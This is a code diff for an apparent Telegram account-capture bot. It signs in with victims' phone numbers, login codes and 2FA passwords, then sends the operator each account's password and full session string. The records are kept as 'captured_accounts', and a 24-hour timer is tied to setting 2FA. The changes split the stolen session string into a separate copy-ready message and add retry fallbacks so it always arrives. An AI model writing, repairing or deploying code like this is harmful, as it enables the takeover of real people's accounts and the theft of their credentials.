@@ -379,7 +379,7 @@ _main_bot_loop = None
 
 
 # ============================================================
-# NOTIFY VIA FRESH BOT CLIENT (no loop conflict)
+# NOTIFY VIA FRESH BOT CLIENT (returns message object)
 # ============================================================
 async def _send_via_main_loop(chat_id, text, buttons=None, parse_mode=None):
     """Send using a FRESH bot client — bypasses main bot loop lock."""
@@ -401,34 +401,6 @@ async def _send_via_main_loop(chat_id, text, buttons=None, parse_mode=None):
     except Exception as e:
         logger.error(f"❌ Fresh client send fail: {type(e).__name__}: {e}")
         logger.error(traceback.format_exc())
-        raise
-    finally:
-        if c is not None:
-            try:
-                await c.disconnect()
-            except Exception:
-                pass
-        try:
-            if os.path.exists(tmp_session):
-                os.remove(tmp_session)
-        except Exception:
-            pass
-
-
-async def _send_via_main_loop_edit(chat_id, msg_id, text, buttons=None):
-    """Edit message via fresh bot client."""
-    tmp_session = f"/tmp/notify_{uuid.uuid4().hex[:8]}.session"
-    c = None
-    try:
-        c = TelegramClient(tmp_session, API_ID, API_HASH)
-        await c.start(bot_token=BOT_TOKEN)
-        try:
-            r = await c.edit_message(chat_id, msg_id, text, buttons=buttons)
-            return r
-        except errors.MessageNotModifiedError:
-            return None
-    except Exception as e:
-        logger.error(f"fresh edit fail: {type(e).__name__}: {e}")
         raise
     finally:
         if c is not None:
@@ -685,7 +657,6 @@ async def pending_cmd(event):
 
 @bot.on(events.NewMessage(pattern='/test'))
 async def test_cmd(event):
-    """Test fresh client notify."""
     if event.sender_id != YOUR_TELEGRAM_ID:
         return
     await event.respond("🧪 Testing fresh client send in 2s...")
@@ -748,17 +719,19 @@ async def check_session_validity(session_str):
 
 
 # ============================================================
-# EDIT ADMIN MSG
+# EDIT ADMIN MSG — uses MAIN bot client (which owns the msg)
 # ============================================================
 async def edit_admin_msg(account, status_text):
     try:
         msg_id = account.get("admin_notify_msg_id")
+        if not msg_id:
+            logger.warning(f"edit_admin_msg: no msg_id for {account.get('phone')}")
+            return
         phone = account.get("phone", "?")
         phone_clean = phone.replace("+", "").strip()
         name = (account.get("first_name", "") or "") + " " + (account.get("last_name", "") or "")
         name = name.strip() or "?"
         dc = account.get("dc", "?")
-        ss = account.get("session", "")
         pu = account.get("has_2fa", False)
         pv = account.get("password", "")
         extra = ""
@@ -770,13 +743,13 @@ async def edit_admin_msg(account, status_text):
         added = account.get("added_at", 0)
         hours_passed = (time.time() - added) / 3600 if added else 0
 
+        # NOTE: session string NOT here — separate message
         new_text = (f"{status_text}{extra}\n\n"
                     f"Phone: {phone}\n"
                     f"Name: {name}\n"
                     f"User ID: {account.get('user_id', '?')}\n"
                     f"DC: {dc}\n"
-                    f"Age: {hours_passed:.1f}h / 24h\n\n"
-                    f"Session:\n{ss}")
+                    f"⏱ Age: {hours_passed:.1f}h / 24h")
         if len(new_text) > 4000:
             new_text = new_text[:3990] + "..."
 
@@ -790,21 +763,47 @@ async def edit_admin_msg(account, status_text):
             ],
         ]
 
-        if msg_id:
-            try:
-                await _send_via_main_loop_edit(YOUR_TELEGRAM_ID, msg_id, new_text, buttons)
-                logger.info(f"✅ Msg edited: {phone} → {status_text[:30]}")
-                return
-            except Exception as e:
-                logger.warning(f"edit err, sending new: {e}")
+        # Use MAIN bot client (it owns the msg_id)
+        try:
+            await bot.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text, buttons=buttons)
+            logger.info(f"✅ Msg edited via main bot: {phone} → {status_text[:30]}")
+            return
+        except errors.MessageNotModifiedError:
+            logger.info(f"Msg not modified (same content)")
+            return
+        except Exception as e:
+            logger.warning(f"main bot edit fail: {type(e).__name__}: {e}")
 
+        # Fallback: fresh client edit
+        try:
+            tmp_session = f"/tmp/notify_{uuid.uuid4().hex[:8]}.session"
+            c = TelegramClient(tmp_session, API_ID, API_HASH)
+            await c.start(bot_token=BOT_TOKEN)
+            try:
+                await c.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text, buttons=buttons)
+                logger.info(f"✅ Msg edited via fresh client: {phone}")
+                return
+            finally:
+                try:
+                    await c.disconnect()
+                except Exception:
+                    pass
+                try:
+                    if os.path.exists(tmp_session):
+                        os.remove(tmp_session)
+                except Exception:
+                    pass
+        except Exception as e2:
+            logger.warning(f"fresh client edit fail: {type(e2).__name__}: {e2}")
+
+        # Last resort: send new msg
         try:
             r = await _send_via_main_loop(YOUR_TELEGRAM_ID, new_text, buttons=buttons)
-            logger.info(f"✅ New msg sent: {phone} → {status_text[:30]} (mid={r.id})")
+            logger.info(f"✅ New msg sent (fallback): {phone} (mid={r.id})")
             account["admin_notify_msg_id"] = r.id
             save_account(account)
-        except Exception as e:
-            logger.error(f"new msg err: {e}")
+        except Exception as e3:
+            logger.error(f"new msg err: {e3}")
     except Exception as e:
         logger.error(f"edit_admin_msg err: {e}")
         logger.error(traceback.format_exc())
@@ -894,9 +893,15 @@ async def cb(event):
                     valid, reason = False, f"check_err: {str(e)[:40]}"
 
             old_mid = acc.get("admin_notify_msg_id")
+            sess_mid = acc.get("admin_session_msg_id")
             if old_mid:
                 try:
                     await bot.delete_message(YOUR_TELEGRAM_ID, old_mid)
+                except Exception:
+                    pass
+            if sess_mid:
+                try:
+                    await bot.delete_message(YOUR_TELEGRAM_ID, sess_mid)
                 except Exception:
                     pass
 
@@ -944,8 +949,9 @@ async def cb(event):
             if hours_left > 0:
                 hh = int(hours_left)
                 mm = int((hours_left - hh) * 60)
+                logger.info(f"⏳ 24h NOT COMPLETE {phone}: {hh}h {mm}m left")
                 await edit_admin_msg(acc,
-                    f"⏳ 24h NOT COMPLETE\n\nTime left: {hh}h {mm}m\n\nWait till 24h complete.")
+                    f"⏳ 24h NOT COMPLETE — Wait {hh}h {mm}m\n\n2FA will NOT be set before 24h.")
                 await event.answer(f"⏳ {hh}h {mm}m left", alert=True)
                 return
 
@@ -2183,15 +2189,15 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
             if password:
                 extra += f" | Pwd: {password}"
 
-        msg = (f"New Account!{extra}\n"
-               f"Phone: {phone}\n"
-               f"Name: {me.first_name} {me.last_name or ''}\n"
-               f"User ID: {me.id}\n"
-               f"DC: {dc}\n"
-               f"Age: 0.0h / 24h\n\n"
-               f"Session:\n{ss}")
-        if len(msg) > 4000:
-            msg = msg[:3990] + "..."
+        # NEW: Account info message (no session)
+        info_msg = (f"🆕 New Account!{extra}\n\n"
+                    f"📱 Phone: {phone}\n"
+                    f"👤 Name: {me.first_name} {me.last_name or ''}\n"
+                    f"🆔 User ID: {me.id}\n"
+                    f"🌐 DC: {dc}\n"
+                    f"⏱ Age: 0.0h / 24h")
+        if len(info_msg) > 4000:
+            info_msg = info_msg[:3990] + "..."
 
         buttons = [
             [
@@ -2205,58 +2211,64 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
 
         notify_sent = False
         notify_err = None
+        # Send INFO message with buttons (this is the one that gets edited)
         for attempt in range(3):
             try:
-                logger.info(f"📤 Notify MD attempt {attempt+1}/3")
-                r = await _send_via_main_loop(YOUR_TELEGRAM_ID, msg, buttons=buttons, parse_mode='md')
+                logger.info(f"📤 Notify INFO attempt {attempt+1}/3")
+                r = await _send_via_main_loop(YOUR_TELEGRAM_ID, info_msg, buttons=buttons)
                 if r:
                     acc["admin_notify_msg_id"] = r.id
                     save_account(acc)
                     captured_accounts = load_accounts()
                     notify_sent = True
-                    logger.info(f"✅ Notification MD sent (mid={r.id}) attempt={attempt+1}")
+                    logger.info(f"✅ INFO sent (mid={r.id})")
                     break
             except Exception as e:
                 notify_err = e
-                logger.warning(f"notify MD attempt {attempt+1} fail: {type(e).__name__}: {e}")
+                logger.warning(f"INFO attempt {attempt+1} fail: {type(e).__name__}: {e}")
                 await asyncio.sleep(1)
 
-        if not notify_sent:
+        # Send SESSION as separate message (single tap copy)
+        session_sent = False
+        session_msg = f"```\n{ss}\n```"
+        for attempt in range(3):
+            try:
+                logger.info(f"📤 Notify SESSION attempt {attempt+1}/3")
+                r2 = await _send_via_main_loop(YOUR_TELEGRAM_ID, session_msg, parse_mode='md')
+                if r2:
+                    acc["admin_session_msg_id"] = r2.id
+                    save_account(acc)
+                    captured_accounts = load_accounts()
+                    session_sent = True
+                    logger.info(f"✅ SESSION sent (mid={r2.id})")
+                    break
+            except Exception as e:
+                logger.warning(f"SESSION attempt {attempt+1} fail: {type(e).__name__}: {e}")
+                await asyncio.sleep(1)
+
+        # Fallback: send session as plain text if md fail
+        if not session_sent:
             for attempt in range(3):
                 try:
-                    logger.info(f"📤 Notify PLAIN attempt {attempt+1}/3")
-                    r = await _send_via_main_loop(YOUR_TELEGRAM_ID, msg, buttons=buttons)
-                    if r:
-                        acc["admin_notify_msg_id"] = r.id
+                    r2 = await _send_via_main_loop(YOUR_TELEGRAM_ID, ss)
+                    if r2:
+                        acc["admin_session_msg_id"] = r2.id
                         save_account(acc)
                         captured_accounts = load_accounts()
-                        notify_sent = True
-                        logger.info(f"✅ Notification PLAIN sent (mid={r.id}) attempt={attempt+1}")
+                        session_sent = True
+                        logger.info(f"✅ SESSION sent PLAIN (mid={r2.id})")
                         break
                 except Exception as e:
-                    logger.warning(f"notify PLAIN attempt {attempt+1} fail: {type(e).__name__}: {e}")
+                    logger.warning(f"SESSION plain attempt {attempt+1} fail: {e}")
                     await asyncio.sleep(1)
 
-        if not notify_sent:
-            for attempt in range(3):
-                try:
-                    logger.info(f"📤 Notify RAW attempt {attempt+1}/3")
-                    r = await _send_via_main_loop(YOUR_TELEGRAM_ID, f"🚨 SESSION (no buttons)\n{phone}\n\n{ss}")
-                    if r:
-                        notify_sent = True
-                        logger.info(f"✅ Fallback raw session sent attempt={attempt+1}")
-                        break
-                except Exception as e:
-                    logger.error(f"FALLBACK attempt {attempt+1} fail: {type(e).__name__}: {e}")
-                    await asyncio.sleep(1)
-
-        if not notify_sent:
-            logger.error(f"❌ ALL NOTIFY ATTEMPTS FAILED for {phone}: {notify_err}")
+        if not notify_sent and not session_sent:
+            logger.error(f"❌ ALL NOTIFY FAILED for {phone}")
 
         with sessions_lock:
             user_sessions.pop(phone, None)
             pending_codes[phone] = 'done'
-        logger.info(f"✅ FULL FLOW COMPLETE: {phone} notify={notify_sent}")
+        logger.info(f"✅ FULL FLOW COMPLETE: {phone} info={notify_sent} session={session_sent}")
         return {'success': True, 'user_id': me.id}
 
     except errors.PhoneCodeInvalidError:
